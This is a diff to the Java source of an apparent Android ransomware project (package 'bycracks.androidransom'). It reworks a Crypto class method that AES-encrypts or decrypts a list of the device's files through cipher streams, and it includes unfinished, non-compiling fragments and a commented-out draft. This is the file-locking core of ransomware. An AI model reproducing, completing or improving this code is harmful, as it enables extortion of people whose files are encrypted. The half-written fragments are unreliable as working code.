@@ -1,12 +1,16 @@
 package bycracks.androidransom;
 
 import java.io.BufferedInputStream;
+import java.io.BufferedOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 
 import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.CipherOutputStream;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.SecretKeySpec;
@@ -42,46 +46,7 @@ public class Crypto {
 
     public void crypto(ArrayList<File> fileList, boolean decrypt) throws Exception {
         Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
-        int r;
-        byte[] buf = new byte[16];
 
-
-        if (decrypt) {
-            for (File inFile: fileList) {
-                BufferedInputStream bis = new BufferedInputStream(new FileInputStream(inFile), 16);
-                while((r = bis.read(buf, 0, 16)) != -1)
-
-
-                cipher.init(Cipher.DECRYPT_MODE, skeySpec);
-                byte[] data = cipher.doFinal(i);
-                inFile.
-
-
-
-            }
-
-        } else {
-            for (File inFile: fileList) {
-
-
-
-
-
-            }
-
-        }
-
-        for (File inFile: fileList) {
-
-
-
-
-
-
-        }
-
-
-        /*
         for (File inFile : fileList) {
             int idx1 = inFile.getPath().lastIndexOf("/");
             int idx2 = inFile.getName().lastIndexOf(".");
@@ -90,15 +55,8 @@ public class Crypto {
             byte[] buf = new byte[8];
             int bytesRead;
 
-
-
-
-
-
-
-
             if (decrypt) {
-                FileOutputStream fos = new FileOutputStream(inFile.getPath().substring(0,idx1+1)+inFile.getName().substring(0,idx2));
+                FileOutputStream fos = new FileOutputStream(inFile.getPath().substring(0,idx1)+"/decrypt/"+inFile.getName().substring(0,idx2));
 
                 cipher.init(Cipher.DECRYPT_MODE, skeySpec);
                 CipherInputStream cis = new CipherInputStream(fis, cipher);     // decrypt
@@ -123,6 +81,23 @@ public class Crypto {
 
             }
             fis.close();
+        }
+
+
+        /*
+        for (File inFile: fileList) {
+            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(inFile));
+            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(inFile));
+
+            byte[] buf = new byte[cipher.getOutputSize((int) inFile.length())];
+            int r;
+
+            while ( (r = bis.read(buf)) != -1) {
+               bos.write(buf);
+            }
+
+
+
         }
         */
     }
